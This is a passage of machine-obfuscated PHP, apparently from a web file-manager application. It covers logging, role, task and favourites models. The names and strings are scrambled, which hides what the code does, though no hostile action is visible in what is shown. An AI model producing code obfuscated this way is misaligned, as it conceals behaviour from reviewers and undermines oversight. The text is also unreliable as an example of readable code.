(!isset($this->typeList[$Ú¾·òÓÉ])) { return; } $ƒûïàƒ† = Session::get($Ñú¿•[2265]); if (!$ƒûïàƒ†) { $ƒûïàƒ† = _get($¢„™–ƒ¡, $Ñú¿•[1539], 0); } if ($Ú¾·òÓÉ == $Ñú¿•[2560] && is_array($¢„™–ƒ¡[$Ñú¿•[2595]]) && !$¢„™–ƒ¡[$Ñú¿•[2595]]) { return; } $…ò©Ë«À = get_client_ip(); if (!$¢„™–ƒ¡ || strlen(json_encode($¢„™–ƒ¡)) >= 1024 * 64) { if ($¢„™–ƒ¡ && is_array($¢„™–ƒ¡)) { $¢„™–ƒ¡ = array_intersect_key($¢„™–ƒ¡, array_flip($Ñú¿•[486], $Ñú¿•[32])); $¢„™–ƒ¡[$Ñú¿•[1555]] = $…ò©Ë«À; } else { $¢„™–ƒ¡ = array($Ñú¿•[1555] => $…ò©Ë«À); } } else { if (is_array($¢„™–ƒ¡)) { $¢„™–ƒ¡[$Ñú¿•[1555]] = $…ò©Ë«À; } else { $¢„™–ƒ¡ = array($Ñú¿•[1336] => $¢„™–ƒ¡, $Ñú¿•[1555] => $…ò©Ë«À); } } $¢„™–ƒ¡[$Ñú¿•[2596]] = ACTION; $¢„™–ƒ¡ = array($Ñú¿•[1912] => Session::sign(), $Ñú¿•[1913] => intval($ƒûïàƒ†), $Ñú¿•[33] => $Ú¾·òÓÉ, $Ñú¿•[1915] => json_encode($¢„™–ƒ¡)); Hook::trigger($Ñú¿•[2597], $¢„™–ƒ¡); return parent::add($¢„™–ƒ¡); } public function remove($‡Úù‰¢) { $this->where(array($_SERVER[€ä¾™²][515] => $‡Úù‰¢))->delete(); } private function _makeOrder($ÜŸõßü = '') { $ÆõÑ”·ª =& $_SERVER[€ä¾™²]; $‘ïŸ‡øŒ = $ÆõÑ”·ª[232]; $úÅ¹ ä = array($ÆõÑ”·ª[544] => $ÆõÑ”·ª[545], $ÆõÑ”·ª[546] => $ÆõÑ”·ª[547]); $´„îñÁö = Input::get($ÆõÑ”·ª[552], $ÆõÑ”·ª[7], $ÆõÑ”·ª[2303], array($ÆõÑ”·ª[2221], $ÆõÑ”·ª[546])); $´„îñÁö = $úÅ¹ ä[$´„îñÁö]; $ÜŸõßü = $ÜŸõßü . "{$‘ïŸ‡øŒ}\x20{$´„îñÁö}"; return $this->order($ÜŸõßü); } public function get($™ÖˆÆ¤Ó = '') { $Ô£ë›ë¸ =& $_SERVER[€ä¾™²]; if (!$™ÖˆÆ¤Ó) { show_json(array()); } $¦ş¡çÇè = array(); if ($™ÖˆÆ¤Ó[$Ô£ë›ë¸[1539]]) { $¦ş¡çÇè[$Ô£ë›ë¸[1539]] = $™ÖˆÆ¤Ó[$Ô£ë›ë¸[1539]]; } if (isset($™ÖˆÆ¤Ó[$Ô£ë›ë¸[861]])) { $çÉÔÒÓ = $™ÖˆÆ¤Ó[$Ô£ë›ë¸[861]]; $’Àå¶©½ = isset($™ÖˆÆ¤Ó[$Ô£ë›ë¸[862]]) ? $™ÖˆÆ¤Ó[$Ô£ë›ë¸[862]] : time(); $¦ş¡çÇè[$Ô£ë›ë¸[232]] = array($Ô£ë›ë¸[409], array($çÉÔÒÓ, $’Àå¶©½)); } if ($™ÖˆÆ¤Ó[$Ô£ë›ë¸[33]]) { $ö…İñÈÏ = explode($Ô£ë›ë¸[50], $™ÖˆÆ¤Ó[$Ô£ë›ë¸[33]]); $Ù Ø¦Ûá = $this->typeFile(); $ÓĞ¹²¡ = array(); foreach ($ö…İñÈÏ as $†ãŒÅÑë) { $ÓĞ¹²¡[] = $†ãŒÅÑë; if (isset($Ù Ø¦Ûá[$†ãŒÅÑë])) { $ÓĞ¹²¡ = array_merge($ÓĞ¹²¡, $Ù Ø¦Ûá[$†ãŒÅÑë]); } } $ÓĞ¹²¡ = array_unique($ÓĞ¹²¡); if ($ÓĞ¹²¡) { $¦ş¡çÇè[$Ô£ë›ë¸[33]] = array($Ô£ë›ë¸[7], $ÓĞ¹²¡); } } else { $¦ş¡çÇè[$Ô£ë›ë¸[33]] = array($Ô£ë›ë¸[2598], $Ô£ë›ë¸[2599]); } if (!empty($™ÖˆÆ¤Ó[$Ô£ë›ë¸[1555]])) { $¦ş¡çÇè[$Ô£ë›ë¸[547]] = array($Ô£ë›ë¸[473], "\x25{$™ÖˆÆ¤Ó[$Ô£ë›ë¸[1555]]}\x25"); } $§Şœå·İ = $this->_makeOrder()->where($¦ş¡çÇè)->selectPage(); if (empty($§Şœå·İ[$Ô£ë›ë¸[446]])) { show_json(array(), !0, $§Şœå·İ[$Ô£ë›ë¸[443]]); } $§Şœå·İ[$Ô£ë›ë¸[446]] = $this->logList($§Şœå·İ[$Ô£ë›ë¸[446]]); return $§Şœå·İ; } private function ipAddress(&$æÅ¾ÛéÆ) { $©ô¢Ò·ô =& $_SERVER[€ä¾™²]; if (!empty($æÅ¾ÛéÆ[$©ô¢Ò·ô[1555]])) { $ı¯Æëáº = IpLocation::get($æÅ¾ÛéÆ[$©ô¢Ò·ô[1555]]); } else { $ı¯Æëáº = LNG($©ô¢Ò·ô[2600]); } $æÅ¾ÛéÆ[$©ô¢Ò·ô[2601]] = $ı¯Æëáº; } private function descZipDownload($ã‹¢ßˆ, &$½”Æœô) { $òæĞÉÁÀ =& $_SERVER[€ä¾™²]; if (!isset($ã‹¢ßˆ[$òæĞÉÁÀ[1562]])) { return; } $Û°ç—»ì = json_decode($ã‹¢ßˆ[$òæĞÉÁÀ[1562]], !0); foreach ($Û°ç—»ì as $¶ãú®³) { try { $Ñ÷€‰Ø¼ = IO::infoFullSimple($¶ãú®³[$òæĞÉÁÀ[87]]); } catch (Exception $Áİ£œ¯º) { continue; } $ã‹¢ßˆ[$òæĞÉÁÀ[87]] = $¶ãú®³[$òæĞÉÁÀ[87]]; $½”Æœô[] = $ã‹¢ßˆ[$òæĞÉÁÀ[192]] = $Ñ÷€‰Ø¼[$òæĞÉÁÀ[192]]; $½”Æœô[] = $ã‹¢ßˆ[$òæĞÉÁÀ[2363]] = $Ñ÷€‰Ø¼[$òæĞÉÁÀ[191]]; break; } return $ã‹¢ßˆ; } private function getSourceList(&$ØüåÎ¹…) { $õí«ñËı =& $_SERVER[€ä¾™²]; $›‚ª³Î = array(); foreach ($ØüåÎ¹… as $½¾€ãä® => $Ù¨×¹”) { $æ²İÔ = json_decode($Ù¨×¹”[$õí«ñËı[547]], !0); if ($Ù¨×¹”[$õí«ñËı[33]] == $õí«ñËı[2103]) { $æ²İÔ = $this->descZipDownload($æ²İÔ, $›‚ª³Î); $ØüåÎ¹…[$½¾€ãä®][$õí«ñËı[547]] = json_encode($æ²İÔ); continue; } if (strpos($Ù¨×¹”[$õí«ñËı[33]], $õí«ñËı[2365]) !== 0) { if (!isset($æ²İÔ[$õí«ñËı[87]]) || strpos($Ù¨×¹”[$õí«ñËı[33]], $õí«ñËı[2602]) !== 0) { continue; } try { $ç«ãÄäÅ = IO::infoFullSimple($æ²İÔ[$õí«ñËı[87]]); } catch (Exception $å”°ëÈ™) { continue; } $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[192]] = $ç«ãÄäÅ[$õí«ñËı[192]]; $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[2363]] = $ç«ãÄäÅ[$õí«ñËı[191]]; $ØüåÎ¹…[$½¾€ãä®][$õí«ñËı[547]] = json_encode($æ²İÔ); continue; } $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[192]]; $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[2363]]; if ($æ²İÔ[$õí«ñËı[33]] == $õí«ñËı[650]) { $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[547]][$õí«ñËı[1289]]; $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[547]][$õí«ñËı[1290]]; } if ($æ²İÔ[$õí«ñËı[33]] == $õí«ñËı[2373]) { $›‚ª³Î[] = $æ²İÔ[$õí«ñËı[547]][$õí«ñËı[192]]; } } if (!$›‚ª³Î) { return array(); } return Model($õí«ñËı[932])->sourceListInfo($›‚ª³Î, !0); } private function logList($˜ÔŒøç•) { $Î´Ğ»Ğ =& $_SERVER[€ä¾™²]; $½˜ĞØšİ = array_to_keyvalue($˜ÔŒøç•, $Î´Ğ»Ğ[12], $Î´Ğ»Ğ[1539]); $¿é‚Ô²è = Model($Î´Ğ»Ğ[624])->userListInfo(array_unique($½˜ĞØšİ)); $ÖøÎ–Õ› = $this->getSourceList($˜ÔŒøç•); $œî‹ã’ = $this->typeAll(); $Ÿîö¢Ó— = array(); $Ø¾ÄÏÉú = array(); foreach ($˜ÔŒøç• as $Ö—ÂÉ×í => $ƒÖŸ¼–›) { $“¢î”»° = $ƒÖŸ¼–›[$Î´Ğ»Ğ[33]]; $†½™†Ò÷ = isset($¿é‚Ô²è[$ƒÖŸ¼–›[$Î´Ğ»Ğ[1539]]]) ? $¿é‚Ô²è[$ƒÖŸ¼–›[$Î´Ğ»Ğ[1539]]] : !1; $Â¯Î¤Ö = strpos($“¢î”»°, $Î´Ğ»Ğ[2603]) === 0 ? LNG($Î´Ğ»Ğ[2604]) : LNG($Î´Ğ»Ğ[2600]); $ƒÖŸ¼–›[$Î´Ğ»Ğ[32]] = isset($†½™†Ò÷[$Î´Ğ»Ğ[32]]) ? $†½™†Ò÷[$Î´Ğ»Ğ[32]] : LNG($Î´Ğ»Ğ[2600]); $ƒÖŸ¼–›[$Î´Ğ»Ğ[2424]] = isset($†½™†Ò÷[$Î´Ğ»Ğ[2424]]) ? $†½™†Ò÷[$Î´Ğ»Ğ[2424]] : $Î´Ğ»Ğ[12]; $ƒÖŸ¼–›[$Î´Ğ»Ğ[1810]] = isset($œî‹ã’[$“¢î”»°]) ? $œî‹ã’[$“¢î”»°] : $Â¯Î¤Ö; $ƒÖŸ¼–›[$Î´Ğ»Ğ[2302]] = $†½™†Ò÷; $ÖƒÑ¤£Í = json_decode($ƒÖŸ¼–›[$Î´Ğ»Ğ[547]], !0); $ƒÖŸ¼–›[$Î´Ğ»Ğ[1555]] = isset($ÖƒÑ¤£Í[$Î´Ğ»Ğ[1555]]) ? $ÖƒÑ¤£Í[$Î´Ğ»Ğ[1555]] : $Î´Ğ»Ğ[12]; $ƒÖŸ¼–›[$Î´Ğ»Ğ[2601]] = IpLocation::get($ƒÖŸ¼–›[$Î´Ğ»Ğ[1555]]); if (strpos($“¢î”»°, $Î´Ğ»Ğ[2365]) === 0 || isset($ÖƒÑ¤£Í[$Î´Ğ»Ğ[2363]])) { $ÖƒÑ¤£Í[$Î´Ğ»Ğ[90]] = $ÖøÎ–Õ›[$ÖƒÑ¤£Í[$Î´Ğ»Ğ[192]]]; $ÖƒÑ¤£Í[$Î´Ğ»Ğ[2378]] = $ÖøÎ–Õ›[$ÖƒÑ¤£Í[$Î´Ğ»Ğ[2363]]]; if ($ÖƒÑ¤£Í[$Î´Ğ»Ğ[33]] == $Î´Ğ»Ğ[650]) { $ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[1289]] = $ÖøÎ–Õ›[$ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[1289]]]; $ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[1290]] = $ÖøÎ–Õ›[$ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[1290]]]; } if ($ÖƒÑ¤£Í[$Î´Ğ»Ğ[33]] == $Î´Ğ»Ğ[2373]) { $ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[192]] = $ÖøÎ–Õ›[$ÖƒÑ¤£Í[$Î´Ğ»Ğ[547]][$Î´Ğ»Ğ[192]]]; } if ($ÖƒÑ¤£Í[$Î´Ğ»Ğ[33]] == $Î´Ğ»Ğ[1277]) { $ÖƒÑ¤£Í[$Î´Ğ»Ğ[2378]] = $ÖƒÑ¤£Í[$Î´Ğ»Ğ[90]]; $ÖƒÑ¤£Í[$Î´Ğ»Ğ[2363]] = $ÖƒÑ¤£Í[$Î´Ğ»Ğ[2378]][$Î´Ğ»Ğ[192]]; $ÖƒÑ¤£Í[$Î´Ğ»Ğ[90]] = !1; $ÖƒÑ¤£Í[$Î´Ğ»Ğ[192]] = $Î´Ğ»Ğ[12]; } $¥º¢ ğú = array($Î´Ğ»Ğ[1277], $Î´Ğ»Ğ[2361]); if (!in_array($ÖƒÑ¤£Í[$Î´Ğ»Ğ[33]], $¥º¢ ğú)) { if ($ÖƒÑ¤£Í[$Î´Ğ»Ğ[90]] && $ÖƒÑ¤£Í[$Î´Ğ»Ğ[90]][$Î´Ğ»Ğ[189]] == $Î´Ğ»Ğ[190]) { $Ø¾ÄÏÉú[] = $ƒÖŸ¼–›[$Î´Ğ»Ğ[486]]; unset($˜ÔŒøç•[$Ö—ÂÉ×í]); continue; } if ($ÖƒÑ¤£Í[$Î´Ğ»Ğ[2378]] && $ÖƒÑ¤£Í[$Î´Ğ»Ğ[2378]][$Î´Ğ»Ğ[189]] == $Î´Ğ»Ğ[190]) { $Ø¾ÄÏÉú[] = $ƒÖŸ¼–›[$Î´Ğ»Ğ[486]]; unset($˜ÔŒøç•[$Ö—ÂÉ×í]); continue; } } } $ƒÖŸ¼–›[$Î´Ğ»Ğ[547]] = $ÖƒÑ¤£Í; unset($ƒÖŸ¼–›[$Î´Ğ»Ğ[2605]]); $Ÿîö¢Ó—[] = $ƒÖŸ¼–›; } $this->clearSystemPathLog($Ø¾ÄÏÉú); return $Ÿîö¢Ó—; } private function clearSystemPathLog($İ¢×ğ—) { $§µ‹Ìà =& $_SERVER[€ä¾™²]; if (count($İ¢×ğ—) == 0) { return; } $ì™¢ìÑ¾ = array($§µ‹Ìà[486] => array($§µ‹Ìà[7], array_unique($İ¢×ğ—))); $this->where($ì™¢ìÑ¾)->delete(); } public function deviceList($ÚÓÅ²àŠ, $¡˜‹À = 0) { $°ñ­‡¬ =& $_SERVER[€ä¾™²]; $şó‡äÀ  = array($°ñ­‡¬[1539] => $ÚÓÅ²àŠ, $°ñ­‡¬[232] => array($°ñ­‡¬[1127], $¡˜‹À), $°ñ­‡¬[33] => $°ñ­‡¬[2074]); $¥£’ºÇÒ = array(); $„Æ©è¤¢ = $this->field($°ñ­‡¬[2606])->where($şó‡äÀ )->order($°ñ­‡¬[2376])->limit(50)->select(); foreach ($„Æ©è¤¢ as $å£´Öƒ© => $™—œŸ®„) { if ($å£´Öƒ© > 0 && abs($™—œŸ®„[$°ñ­‡¬[232]] - $„Æ©è¤¢[$å£´Öƒ© - 1][$°ñ­‡¬[232]]) < 5) { continue; } $æ“¶¤‚¦ = json_decode($™—œŸ®„[$°ñ­‡¬[547]], !0); $™—œŸ®„[$°ñ­‡¬[1555]] = isset($æ“¶¤‚¦[$°ñ­‡¬[1555]]) ? $æ“¶¤‚¦[$°ñ­‡¬[1555]] : $°ñ­‡¬[12]; unset($æ“¶¤‚¦[$°ñ­‡¬[1555]]); $ïËó—å = $this->deviceType($æ“¶¤‚¦[$°ñ­‡¬[2366]]); if (isset($¥£’ºÇÒ[$ïËó—å])) { continue; } $™—œŸ®„[$°ñ­‡¬[2601]] = IpLocation::get($™—œŸ®„[$°ñ­‡¬[1555]]); $™—œŸ®„[$°ñ­‡¬[547]] = $æ“¶¤‚¦; $¥£’ºÇÒ[$ïËó—å] = $™—œŸ®„; } return array_values($¥£’ºÇÒ); } public function deviceType($³»üôÂ¬) { return $³»üôÂ¬; } } goto f±òªß»İ¸; c°£„Õ„²Ø: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\162\x6f\154\x65\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\141\x75\164\150", "\154\141\x62\145\x6c", "\x64\x69\x73\160\154\x61\x79", "\x73\171\163\164\x65\155", "\x64\145\x73\143", "\151\x67\156\157\x72\x65\x45\170\164", "\x69\147\x6e\x6f\x72\x65\106\151\x6c\145\123\x69\x7a\145", "\x61\x64\155\x69\x6e\151\x73\164\162\x61\x74\157\x72", "\163\x6f\x72\x74"); public function listData($ù¼¾Êüò = false, $Şô‰†ö = "\x73\157\162\164", $àş½¸Á = false) { $ñ¾ÕğÈÅ =& $_SERVER[€ä¾™²]; $îú¢®Ñ = parent::listData($ù¼¾Êüò, $Şô‰†ö, $àş½¸Á); if (!$ù¼¾Êüò) { foreach ($îú¢®Ñ as $ÄØ¤ƒÒü => $Æ€§öäµ) { if ($Æ€§öäµ[$ñ¾ÕğÈÅ[2321]] == 1) { $îú¢®Ñ[$ÄØ¤ƒÒü][$ñ¾ÕğÈÅ[547]] = LNG($ñ¾ÕğÈÅ[2613]); } } } return $îú¢®Ñ; } public function update($ãĞªÉá, $÷Ş§ÔèÁ) { $’—®½Ïº =& $_SERVER[€ä¾™²]; $×û’«¾¸ = parent::listData($ãĞªÉá); $°·¬”ğå = $this->findByName($÷Ş§ÔèÁ[$’—®½Ïº[32]]); if (!$×û’«¾¸ || $°·¬”ğå && $°·¬”ğå[$’—®½Ïº[486]] != $×û’«¾¸[$’—®½Ïº[486]]) { return !1; } if ($°·¬”ğå[$’—®½Ïº[2321]] == 1) { $÷Ş§ÔèÁ = array($’—®½Ïº[32] => $÷Ş§ÔèÁ[$’—®½Ïº[32]], $’—®½Ïº[2149] => $÷Ş§ÔèÁ[$’—®½Ïº[2149]]); } $this->filterAuth($÷Ş§ÔèÁ[$’—®½Ïº[509]]); return parent::update($ãĞªÉá, $÷Ş§ÔèÁ); } public function remove($èÅï…ã) { $©Ë§÷şñ = parent::listData($èÅï…ã); if (!$©Ë§÷şñ || $©Ë§÷şñ[$_SERVER[€ä¾™²][190]]) { return !1; } return parent::remove($èÅï…ã); } public function add($ìûÓçˆü) { $Á„£—›° =& $_SERVER[€ä¾™²]; $Äğ£¦ = $ìûÓçˆü[$Á„£—›°[32]]; if ($this->findByName($Äğ£¦)) { return !1; } $şßÃÏšá = array($Á„£—›°[516] => $Äğ£¦, $Á„£—›°[2134] => $Á„£—›°[12], $Á„£—›°[2130] => $Á„£—›°[2138], $Á„£—›°[2614] => 1, $Á„£—›°[2133] => 0, $Á„£—›°[2615] => 0, $Á„£—›°[2132] => $this->getSort()); $ìûÓçˆü = array_merge($şßÃÏšá, $ìûÓçˆü); $this->filterAuth($ìûÓçˆü[$Á„£—›°[509]]); return parent::insert($ìûÓçˆü); } private function getSort() { $×Ô®”¢Ñ =& $_SERVER[€ä¾™²]; $Õ¡Î…Ô = parent::listData(); $ÇëÅ¸Ä = array_to_keyvalue($Õ¡Î…Ô, $×Ô®”¢Ñ[12], $×Ô®”¢Ñ[2150]); return empty($ÇëÅ¸Ä) ? 0 : max($ÇëÅ¸Ä) + 1; } private function filterAuth(&$°íšÅÇà) { $Œ­ï´©÷ =& $_SERVER[€ä¾™²]; $œá‚¬œ¹ = array(); $Ã°Ôñ = array_filter(explode($Œ­ï´©÷[50], $°íšÅÇà)); foreach ($Ã°Ôñ as $°íšÅÇà) { $¸³™ë…† = explode($Œ­ï´©÷[10], $°íšÅÇà); if ($¸³™ë…†[0] == $Œ­ï´©÷[2616] && $¸³™ë…†[1] != $Œ­ï´©÷[1252]) { $ß È×Ë = $¸³™ë…†[0] . $Œ­ï´©÷[10] . $¸³™ë…†[1] . $Œ­ï´©÷[2617]; if (!in_array($ß È×Ë, $Ã°Ôñ)) { $œá‚¬œ¹[] = $ß È×Ë; } } $œá‚¬œ¹[] = $°íšÅÇà; } $°íšÅÇà = implode($Œ­ï´©÷[50], $œá‚¬œ¹); } public function findRoleDefault() { $¬èµ¾ÖÕ =& $_SERVER[€ä¾™²]; $­—ê¿¿ = parent::listData(); $Æ¯îê¯„ = !1; foreach ($­—ê¿¿ as $Ç«½‹) { if (!$Ç«½‹ || $Ç«½‹[$¬èµ¾ÖÕ[2148]] == $¬èµ¾ÖÕ[229] || $Ç«½‹[$¬èµ¾ÖÕ[2321]] == 1) { continue; } if (strstr($Ç«½‹[$¬èµ¾ÖÕ[509]], $¬èµ¾ÖÕ[2618])) { continue; } if (!strstr($Ç«½‹[$¬èµ¾ÖÕ[509]], $¬èµ¾ÖÕ[2619])) { continue; } if (!$Æ¯îê¯„) { $Æ¯îê¯„ = $Ç«½‹; continue; } $åÈÖ…¯½ = explode($¬èµ¾ÖÕ[50], $Æ¯îê¯„[$¬èµ¾ÖÕ[509]]); $«½‘Ñãï = explode($¬èµ¾ÖÕ[50], $Ç«½‹[$¬èµ¾ÖÕ[509]]); if (count($åÈÖ…¯½) > count($«½‘Ñãï)) { $Æ¯îê¯„ = $Ç«½‹; } } return $Æ¯îê¯„ ? $Æ¯îê¯„[$¬èµ¾ÖÕ[486]] : $¬èµ¾ÖÕ[12]; } public function sort($…˜÷‘õØ, $Ğ’ú•üÊ) { return parent::update($…˜÷‘õØ, $Ğ’ú•üÊ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x74\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x74\x79\x70\145", "\145\x76\145\x6e\x74", "\164\151\x6d\145", "\x64\145\x73\x63", "\163\171\163\x74\145\155", "\145\156\141\x62\x6c\145", "\154\141\x73\x74\122\165\156", "\163\157\162\x74"); public function listData($»Ã¯ĞíÜ = false, $·£‰ô‘À = "\x73\157\162\164", $ùêÏ¯Œ¢ = false) { return parent::listData($»Ã¯ĞíÜ, $·£‰ô‘À, $ùêÏ¯Œ¢); } public function add($´äÂôƒã) { $©Ğ½Æ§ =& $_SERVER[€ä¾™²]; $‘Ï·˜©ë = $this->findByName($´äÂôƒã[$©Ğ½Æ§[32]]); if ($‘Ï·˜©ë) { return !1; } $´äÂôƒã[$©Ğ½Æ§[1873]] = 0; $´äÂôƒã[$©Ğ½Æ§[2150]] = $this->getSort(); return parent::insert($´äÂôƒã); } private function getSort() { $“òıÏ¬ò =& $_SERVER[€ä¾™²]; $Ÿıè­³Ñ = parent::listData(); $›ÛÆÒ¾‰ = array_to_keyvalue($Ÿıè­³Ñ, $“òıÏ¬ò[12], $“òıÏ¬ò[2150]); return empty($›ÛÆÒ¾‰) ? 0 : max($›ÛÆÒ¾‰) + 1; } public function update($‘ƒó“ğù, $¾¦‰Ğ®Ø) { $×åûÃõ‡ =& $_SERVER[€ä¾™²]; $ş›Ä¦Ö‹ = $this->listData($‘ƒó“ğù); $»Ğ¼«²ã = $this->findByName($¾¦‰Ğ®Ø[$×åûÃõ‡[32]]); if (!$ş›Ä¦Ö‹ || $»Ğ¼«²ã && $»Ğ¼«²ã[$×åûÃõ‡[486]] != $ş›Ä¦Ö‹[$×åûÃõ‡[486]]) { return !1; } return parent::update($‘ƒó“ğù, $¾¦‰Ğ®Ø); } public function remove($’¿¢®şÛ, $·Ë“™‹ = false) { $îš‡ê¶ =& $_SERVER[€ä¾™²]; $®ë†”·€ = $this->listData($’¿¢®şÛ); if (!$®ë†”·€) { return; } if (!$·Ë“™‹ && $®ë†”·€[$îš‡ê¶[190]] == $îš‡ê¶[91]) { return !1; } return parent::remove($’¿¢®şÛ); } public function enable($“•ˆà“Ş, $ŸûÓ±) { return $this->update($“•ˆà“Ş, array($_SERVER[€ä¾™²][2608] => $ŸûÓ±)); } public function run($½ÛÜ‚ç) { return $this->update($½ÛÜ‚ç, array($_SERVER[€ä¾™²][2620] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($øäŞ’ş÷) { $¼©àø  =& $_SERVER[€ä¾™²]; return array($¼©àø [2240] => array(USER_ID, $¼©àø [2621])); } protected function ___listData() { $Ğ¼äÃô¢ =& $_SERVER[€ä¾™²]; $ÃúŞÚ = array($Ğ¼äÃô¢[1913] => USER_ID, $Ğ¼äÃô¢[580] => 0); $÷¿§Òƒ­ = $Ğ¼äÃô¢[2622]; $Ë©¹©· = $this->field($÷¿§Òƒ­)->where($ÃúŞÚ)->order($Ğ¼äÃô¢[2623])->select(); return $Ë©¹©· ? $Ë©¹©· : array(); } protected function resetCache() { } protected function listView() { $…Õ«³‹° =& $_SERVER[€ä¾™²]; $Ö²Üõï’ = $this->listData(); $ß™ŸèŞõ = array_filter_by_field($Ö²Üõï’, $…Õ«³‹°[33], $…Õ«³‹°[512]); $Ãö˜€Ñ = array_to_keyvalue($ß™ŸèŞõ, $…Õ«³‹°[12], $…Õ«³‹°[87]); if (!$Ãö˜€Ñ) { return $Ö²Üõï’; } $µØÀ‚ƒÕ = 2000; $ïù‰‚· = array($…Õ«³‹°[513] => array($…Õ«³‹°[514], $Ãö˜€Ñ)); $‹½«ÊÑ© = Model($…Õ«³‹°[932])->listSource($ïù‰‚·, $µØÀ‚ƒÕ); $‹½«ÊÑ© = array_merge($‹½«ÊÑ©[$…Õ«³‹°[86]], $‹½«ÊÑ©[$…Õ«³‹°[85]]); $‹½«ÊÑ© = array_to_keyvalue($‹½«ÊÑ©, $…Õ«³‹°[192]); foreach ($Ö²Üõï’ as $Ë÷‰£Ùˆ => $Ö¹Å°©˜) { $Ä„Éëñ = $‹½«ÊÑ©[$Ö¹Å°©˜[$…Õ«³‹°[87]]]; $Ä„Éëñ = $Ä„Éëñ ? $Ä„Éëñ : array(); $Ö²Üõï’[$Ë÷‰£Ùˆ] = array_merge($Ä„Éëñ, $Ö¹Å°©˜); } return $Ö²Üõï’; } protected function addFav($æ£¤·šÈ, $› „­œó = '', $Œ£ß­ = "\x73\x6f\x75\162\x63\145") { $©¼Æ€˜ =& $_SERVER[€ä¾™²]; $§•–ï = array($©¼Æ€˜[1913] => USER_ID, $©¼Æ€˜[580] => 0, $©¼Æ€˜[518] => $Œ£ß­, $©¼Æ€˜[517] => $æ£¤·šÈ); if ($this->where($§•–ï)->find()) { return !1; } $§•–ï = array($©¼Æ€˜[1913] => USER_ID, $©¼Æ€˜[580] => 0); $İé »Ì¶ = $this->where($§•–ï)->max($©¼Æ€˜[2150]); if (!$İé »Ì¶) { $İé »Ì¶ = 0; } if (!$› „­œó && $Œ£ß­ == $©¼Æ€˜[512]) { $éÃà“Çæ = Model($©¼Æ€˜[1479])->where(array($©¼Æ€˜[513] => $æ£¤·šÈ))->find(); if (!$éÃà“Çæ) { return !1; } $› „­œó = $éÃà“Çæ[$©¼Æ€˜[32]]; } $› „­œó = $this->getAutoName($› „­œó); $ÛŒæ´› = array($©¼Æ€˜[1913] => USER_ID, $©¼Æ€˜[580] => 0, $©¼Æ€˜[516] => $› „­œó, $©¼Æ€˜[517] => $æ£¤·šÈ, $©¼Æ€˜[518] => $Œ£ß­, $©¼Æ€˜[2132] => $İé »Ì¶ + 1); return $this->add($ÛŒæ´›); } protected function remove($òà–¼¦ä) { $¢®Ø‡Œ– =& $_SERVER[€ä¾™²]; $¾‘êßƒ = array($¢®Ø‡Œ–[1913] => USER_ID, $¢®Ø‡Œ–[515] => $òà–¼¦ä); return $this->where($¾‘êßƒ)->delete(); } protected function removeByName($Â¨ı¥È) { $˜ğ¯“âÓ =& $_SERVER[€ä¾™²]; $Õ¤ÊÊ = array($˜ğ¯“âÓ[1913] => USER_ID, $˜ğ¯“âÓ[516] => $Â¨ı¥È, $˜ğ¯“âÓ[580] => 0); return $this->where($Õ¤ÊÊ)->delete(); } protected function rename($ ïÕÌŸ, $‘ÓÁ¿™) { $šË¾¸™æ =& $_SERVER[€ä¾™²]; if ($ ïÕÌŸ == $‘ÓÁ¿™) { return !1; } $ö„ú¾ ú = $this->getAutoName($‘ÓÁ¿™); if ($‘ÓÁ¿™ != $ö„ú¾ ú) { return !1; } $Ê™¡ÄÛ³ = array($šË¾¸™æ[1913] => USER_ID, $šË¾¸™æ[580] => 0, $šË¾¸™æ[32] => $ ïÕÌŸ); return $this->where($Ê™¡ÄÛ³)->save(array($šË¾¸™æ[32] => $‘ÓÁ¿™)); } protected function resetSort($½¦ãì®„) { $‡Ÿ½±Õ =& $_SERVER[€ä¾™²]; $½¦ãì®„ = is_array($½¦ãì®„) ? $½¦ãì®„ : array(); $ïç²îç = array($‡Ÿ½±Õ[1913] => USER_ID); for ($¨­Åšøó = 0; $¨­Åšøó < count($½¦ãì®„); $¨­Åšøó++) { $ïç²îç[$‡Ÿ½±Õ[515]] = $½¦ãì®„[$¨­Åšøó]; $this->where($ïç²îç)->save(array($‡Ÿ½±Õ[2132] => $¨­Åšøó + 1)); } return !0; } protected function moveTop($Øß‹×œª) { $ÒªÇ­™ =& $_SERVER[€ä¾™²]; $Û®¹ö¸ = array($ÒªÇ­™[1913] => USER_ID, $ÒªÇ­™[580] => 0); $Üû Äƒ = $this->where($Û®¹ö¸)->where(array($ÒªÇ­™[32] => $Øß‹×œª))->find(); if (!$Üû Äƒ) { return; } $·ø´–Ø™ = $this->field($ÒªÇ­™[486])->where($Û®¹ö¸)->order($ÒªÇ­™[2623])->select(); $·ø´–Ø™ = array_to_keyvalue($·ø´–Ø™, $ÒªÇ­™[12], $ÒªÇ­™[486]); $¥µúë›» = $·ø´–Ø™; $·ø´–Ø™ = array_remove_value($·ø´–Ø™, $Üû Äƒ[$ÒªÇ­™[486]]); array_unshift($·ø´–Ø™, $Üû Äƒ[$ÒªÇ­™[486]]); return $this->resetSort($·ø´–Ø™); } protected function moveBottom($ÕÎ½«›ñ) { $ıûÅêì½ =& $_SERVER[€ä¾™²]; $…»½ğœ¼ = array($ıûÅêì½[1913] => USER_ID, $ıûÅêì½[580] => 0); $ãŠº›¯ = $this->where($…»½ğœ¼)->max($ıûÅêì½[2150]); $‘­§ƒÓ¼ = array($ıûÅêì½[2150] => $ãŠº›¯ + 1); return $this->where($…»½ğœ¼)->where(array($ıûÅêì½[32] => 